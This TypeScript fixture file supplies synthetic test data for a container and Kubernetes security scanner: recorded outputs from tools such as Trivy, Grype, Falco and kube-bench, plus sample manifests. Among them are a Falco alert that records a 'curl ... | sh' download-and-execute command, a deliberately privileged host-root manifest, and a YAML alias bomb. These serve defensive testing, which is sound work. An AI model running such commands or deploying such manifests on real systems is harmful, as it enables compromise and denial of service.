/**
 * Prompt 13 — fixture lab (§94). ALL data here is synthetic/recorded:
 * documentation-range image references, publicly documented example
 * secrets (AWS's own documentation key), and well-known historical CVE
 * fixtures. No real cluster, registry or image is ever contacted; no
 * fixture secret is a real credential.
 */

export const FIXTURE_IMAGE_REF = "registry.example.com/team/webapp:1.4.2";
export const FIXTURE_IMAGE_DIGEST = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
export const FIXTURE_IMAGE_DIGEST_DRIFTED = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
export const FIXTURE_LAYER_DIGEST = "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
export const FIXTURE_CLUSTER_REF = "fixture-cluster";
/** AWS's published documentation example key — NOT a real credential. */
export const FIXTURE_FAKE_IMAGE_SECRET = "AKIAIOSFODNN7EXAMPLE";

export const FIXTURE_TRIVY_OUTPUT = JSON.stringify({
  ArtifactName: FIXTURE_IMAGE_REF,
  ArtifactType: "container_image",
  Metadata: {
    ImageID: FIXTURE_IMAGE_DIGEST,
    OS: { Family: "debian", Name: "12.5" },
    DiffIDs: [FIXTURE_LAYER_DIGEST],
    Config: {
      User: "root",
      ExposedPorts: { "8080/tcp": {} },
      Entrypoint: ["/bin/sh", "-c", "/opt/app/start.sh"],
      Cmd: ["serve"],
      Env: ["PATH=/usr/local/bin", "APP_HOME=/opt/app"],
      Labels: { maintainer: "Rudra", team: "platform" },
    },
  },
  Results: [
    {
      Target: FIXTURE_IMAGE_REF,
      Class: "os-pkgs",
      Type: "debian",
      Vulnerabilities: [
        {
          VulnerabilityID: "CVE-2023-0286",
          PkgName: "openssl",
          InstalledVersion: "1.1.1n",
          FixedVersion: "1.1.1t",
          Severity: "HIGH",
          Description: "X.509 certificate verification issue in OpenSSL (fixture record).",
          CweIDs: ["CWE-295"],
          References: ["https://www.openssl.org/news/secadv/20230207.txt"],
          Layer: { DiffID: FIXTURE_LAYER_DIGEST },
        },
      ],
    },
    {
      Target: "app/pom.xml",
      Class: "lang-pkgs",
      Type: "maven",
      Vulnerabilities: [
        {
          VulnerabilityID: "CVE-2021-44228",
          PkgName: "log4j-core",
          InstalledVersion: "2.14.1",
          FixedVersion: "2.17.1",
          Severity: "CRITICAL",
          Description: "Log4Shell fixture record (historical, publicly documented).",
          CweIDs: ["CWE-502"],
          References: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        },
      ],
    },
    {
      Target: "Dockerfile",
      Class: "config",
      Type: "dockerfile",
      Misconfigurations: [
        {
          ID: "DS002", AVDID: "AVD-DS-0002", Title: "Root user in Dockerfile",
          Description: "The Dockerfile does not declare a non-root USER.",
          Severity: "HIGH", Resolution: "Add a USER instruction with a non-root user.",
          PrimaryURL: "https://avd.aquasec.com/misconfig/ds002",
          CauseMetadata: { Resource: "Dockerfile", StartLine: 1 },
        },
      ],
    },
    {
      Target: "app/config.txt",
      Class: "secret",
      Secrets: [
        { RuleID: "aws-access-key-id", Category: "AWS", Severity: "CRITICAL", Title: "AWS Access Key ID", Match: `aws_key = "${FIXTURE_FAKE_IMAGE_SECRET}"` },
      ],
    },
  ],
});

/** Grype over the same fixture image: reports the SAME openssl CVE
 *  (must merge with Trivy per §20) plus one Grype-only match. */
export const FIXTURE_GRYPE_IMAGE_OUTPUT = JSON.stringify({
  matches: [
    {
      vulnerability: { id: "CVE-2023-0286", severity: "High", fix: { state: "fixed", versions: ["1.1.1t"] }, dataSource: "https://github.com/anchore/grype-db" },
      artifact: {
        name: "openssl", version: "1.1.1n", type: "deb",
        purl: "pkg:deb/debian/openssl@1.1.1n",
        locations: [{ path: "/var/lib/dpkg/status", layerID: FIXTURE_LAYER_DIGEST }],
      },
    },
    {
      vulnerability: { id: "CVE-2022-0778", severity: "High", fix: { state: "fixed", versions: ["1.1.1n"] }, dataSource: "https://github.com/anchore/grype-db" },
      artifact: {
        name: "libssl1.1", version: "1.1.1m", type: "deb",
        purl: "pkg:deb/debian/libssl1.1@1.1.1m",
        locations: [{ path: "/var/lib/dpkg/status", layerID: FIXTURE_LAYER_DIGEST }],
      },
    },
  ],
  source: { type: "image", metadata: { userInput: FIXTURE_IMAGE_REF, manifestDigest: FIXTURE_IMAGE_DIGEST } },
  descriptor: { name: "grype", version: "0.92.0" },
});

export const FIXTURE_SYFT_OUTPUT = JSON.stringify({
  artifacts: [
    { name: "openssl", version: "1.1.1n", type: "deb", purl: "pkg:deb/debian/openssl@1.1.1n", licenses: ["OpenSSL"] },
    { name: "lodash", version: "4.17.20", type: "npm", purl: "pkg:npm/lodash@4.17.20", licenses: ["MIT"] },
  ],
  source: {
    type: "image",
    metadata: {
      userInput: FIXTURE_IMAGE_REF, imageID: FIXTURE_IMAGE_DIGEST, manifestDigest: FIXTURE_IMAGE_DIGEST,
      architecture: "amd64", os: "linux",
      layers: [{ digest: FIXTURE_LAYER_DIGEST, size: 1048576 }],
    },
  },
});

export const FIXTURE_DOCKER_BENCH_OUTPUT = JSON.stringify({
  dockerbenchsecurity: "1.5.0",
  tests: [
    { id: "1.1.1", desc: "Ensure a separate partition for containers has been created", result: "PASS", details: "Partition exists", remediation: "" },
    { id: "4.1", desc: "Ensure that a user for the container has been created", result: "WARN", details: "Image runs as root", remediation: "Create a non-root user in the Dockerfile." },
    { id: "2.8", desc: "Ensure the default ulimit is configured appropriately", result: "INFO", details: "", remediation: "" },
  ],
});

export const FIXTURE_KUBE_BENCH_OUTPUT = JSON.stringify({
  Controls: [
    {
      id: "1", text: "Master Node Security Configuration",
      tests: [
        {
          section: "1.1", desc: "API Server",
          results: [
            { test_number: "1.1.1", test_desc: "Ensure that the --anonymous-auth argument is set to false", status: "PASS", remediation: "" },
            { test_number: "1.1.12", test_desc: "Ensure that the admission control plugin AlwaysPullImages is set", status: "FAIL", test_info: "AlwaysPullImages not set", remediation: "Edit the API server pod specification and set --enable-admission-plugins=AlwaysPullImages." },
          ],
        },
      ],
    },
  ],
  Totals: { total_pass: 1, total_fail: 1, total_warn: 0, total_info: 0 },
});

export const FIXTURE_KUBESCAPE_OUTPUT = JSON.stringify({
  results: [
    {
      resource: { kind: "Deployment", namespace: "prod", name: "webapp", source: { kind: "Deployment", namespace: "prod", name: "webapp" } },
      controls: [
        {
          controlID: "C-0057", name: "Privileged container", status: "failed",
          rules: [{ name: "rule-privileged-container", status: "failed", failedResources: ["webapp"] }],
          remediation: "Set securityContext.privileged=false.",
        },
        {
          controlID: "C-0017", name: "Immutable container filesystem", status: "passed",
          rules: [{ name: "rule-immutable-fs", status: "passed" }],
        },
      ],
    },
  ],
});

export const FIXTURE_KUBE_HUNTER_OUTPUT = JSON.stringify({
  vulnerabilities: [
    {
      location: "fixture-node-1", category: "api-server", vulnerability: "Exposed API server dashboard",
      description: "The Kubernetes dashboard is exposed without authentication (fixture).",
      severity: "high", evidence: "Dashboard reachable on the fixture node.",
    },
  ],
  services: [{ service: "API Server", location: "fixture-node-1" }],
});

export const FIXTURE_CHECKOV_OUTPUT = JSON.stringify([
  {
    check_type: "kubernetes",
    results: {
      passed_checks: [{ check_id: "CKV_K8S_8", check_name: "Liveness probe is configured" }],
      failed_checks: [
        {
          check_id: "CKV_K8S_16", check_name: "Container should not be privileged",
          file_path: "/k8s/deployment.yaml", resource: "Deployment.default.webapp",
          file_line_range: [12, 18], guideline: "https://docs.prismacloud.io/en/enterprise-edition/policy-reference/kubernetes-policies/kubernetes-policy-index/ensure-containers-must-not-be-privileged",
          severity: "HIGH",
        },
      ],
    },
  },
]);

const FALCO_ESCAPE = String.fromCharCode(27);
export const FIXTURE_FALCO_OUTPUT = [
  JSON.stringify({
    rule: "Terminal shell in container", priority: "WARNING", time: "2026-10-07T10:15:30.000Z",
    output: `A shell was spawned in a container (user=root) ${FALCO_ESCAPE}[31mRED${FALCO_ESCAPE}[0m`,
    output_fields: {
      "container.name": "webapp", "k8s.ns.name": "prod", "k8s.pod.name": "webapp-7d9c",
      "proc.cmdline": "sh -c curl http://198.51.100.23/x | sh", "user.name": "root",
    },
  }),
  JSON.stringify({
    rule: "Write below binary directory", priority: "ERROR", time: "2026-10-07T10:16:05.000Z",
    output: "File write below /usr/bin by a container process (fixture)",
    output_fields: {
      "container.name": "webapp", "k8s.ns.name": "prod", "k8s.pod.name": "webapp-7d9c",
      "fd.name": "/usr/bin/helper", "user.name": "root", "leaked": `token=${FIXTURE_FAKE_IMAGE_SECRET}`,
    },
  }),
].join("\n");

/** Fixture manifests (§99): one hardened workload, one privileged
 *  workload, a cluster-admin binding and a Secret (metadata only). */
export const FIXTURE_K8S_MANIFEST_SAFE = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: webapp
  namespace: prod
spec:
  replicas: 2
  template:
    spec:
      serviceAccountName: webapp
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
      containers:
        - name: webapp
          image: registry.example.com/team/webapp:1.4.2@${FIXTURE_IMAGE_DIGEST}
          securityContext:
            privileged: false
            readOnlyRootFilesystem: true
            allowPrivilegeEscalation: false
          resources:
            limits:
              cpu: "500m"
              memory: "256Mi"
`;

export const FIXTURE_K8S_MANIFEST_PRIVILEGED = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: legacy-agent
  namespace: default
spec:
  replicas: 1
  template:
    spec:
      hostNetwork: true
      containers:
        - name: agent
          image: registry.example.com/team/agent:latest
          securityContext:
            privileged: true
            capabilities:
              add: ["SYS_ADMIN"]
          volumeMounts:
            - name: hostroot
              mountPath: /host
      volumes:
        - name: hostroot
          hostPath:
            path: /
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: fixture-admin-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: legacy-agent
    namespace: default
---
apiVersion: v1
kind: Secret
metadata:
  name: app-secret
  namespace: default
type: Opaque
data:
  password: Zml4dHVyZS1vbmx5LW5vdC1hLXJlYWwtc2VjcmV0
`;

export const FIXTURE_DOCKERFILE = `FROM debian:12
RUN apt-get update && apt-get install -y openssl
COPY app /opt/app
ENTRYPOINT ["/opt/app/start.sh"]
`;

/** Recorded cluster inventory (§99): mirrors the connector transport
 *  contract — workloads, RBAC, policy coverage, Secret COUNT only. */
export const FIXTURE_CLUSTER_INVENTORY = {
  version: "1.29.4",
  namespaces: ["prod", "default", "kube-system"],
  namespacesWithNetworkPolicy: ["prod"],
  secretMetadataCount: 3,
  ingresses: [{ namespace: "prod", name: "web", hosts: ["app.example.com"], tls: true }],
  roleBindings: [
    {
      namespace: "default", name: "fixture-admin-binding", roleKind: "ClusterRole", roleName: "cluster-admin",
      subjects: [{ kind: "ServiceAccount", name: "legacy-agent", namespace: "default" }],
    },
    {
      namespace: "prod", name: "webapp-view", roleKind: "Role", roleName: "view",
      subjects: [{ kind: "ServiceAccount", name: "webapp", namespace: "prod" }], verbs: ["get", "list"], resources: ["pods"],
    },
  ],
  workloads: [
    {
      clusterRef: FIXTURE_CLUSTER_REF, kind: "Deployment", namespace: "prod", name: "webapp", replicas: 2,
      serviceAccount: "webapp",
      images: [{ container: "webapp", image: `registry.example.com/team/webapp:1.4.2@${FIXTURE_IMAGE_DIGEST}`, digest: FIXTURE_IMAGE_DIGEST, tagPinned: true, digestPinned: true }],
      securityContext: {
        privileged: false, runAsRoot: false, allowPrivilegeEscalation: false, readOnlyRootFilesystem: true,
        hostNetwork: false, hostPid: false, hostIpc: false, hostPaths: [], addedCapabilities: [],
        automountServiceAccountToken: false, resourceLimitsDeclared: true,
      },
      exposure: "PUBLIC_INTERNET", labels: { app: "webapp" },
    },
    {
      clusterRef: FIXTURE_CLUSTER_REF, kind: "Deployment", namespace: "default", name: "legacy-agent", replicas: 1,
      images: [{ container: "agent", image: "registry.example.com/team/agent:latest", tagPinned: false, digestPinned: false }],
      securityContext: {
        privileged: true, allowPrivilegeEscalation: true, readOnlyRootFilesystem: false,
        hostNetwork: true, hostPid: false, hostIpc: false, hostPaths: ["/"], addedCapabilities: ["SYS_ADMIN"],
        automountServiceAccountToken: true, resourceLimitsDeclared: false,
      },
      exposure: "CLUSTER_INTERNAL", labels: { app: "legacy-agent" },
    },
  ],
};

/** Hostile YAML (§49/§100): custom tag + alias bomb + oversized doc
 *  are all rejected by the safe loader. */
export const FIXTURE_HOSTILE_YAML_CUSTOM_TAG = `apiVersion: v1
kind: Pod
metadata:
  name: evil
spec: !Ref "SomeCustomTag"
`;
export const FIXTURE_HOSTILE_YAML_ALIAS_BOMB = (() => {
  const lines = ["a: &a [\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\"]"];
  for (let i = 1; i <= 9; i++) lines.push(`${"bcdefghij"[i - 1]}: &${"bcdefghij"[i - 1]} [${Array(10).fill(`*${"abcdefghi"[i - 1]}`).join(",")}]`);
  lines.push(`z: *j`);
  return lines.join("\n");
})();

/** A CycloneDX SBOM for the fixture image (§14 import path). */
export const FIXTURE_CYCLODX_SBOM = JSON.stringify({
  bomFormat: "CycloneDX", specVersion: "1.5",
  metadata: {
    component: {
      type: "container", name: FIXTURE_IMAGE_REF,
      hashes: [{ alg: "SHA-256", content: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }],
    },
  },
  components: [
    { type: "library", name: "openssl", version: "1.1.1n", purl: "pkg:deb/debian/openssl@1.1.1n", licenses: [{ license: { id: "OpenSSL" } }] },
    { type: "library", name: "lodash", version: "4.17.20", purl: "pkg:npm/lodash@4.17.20", licenses: [{ license: { id: "MIT" } }] },
  ],
});
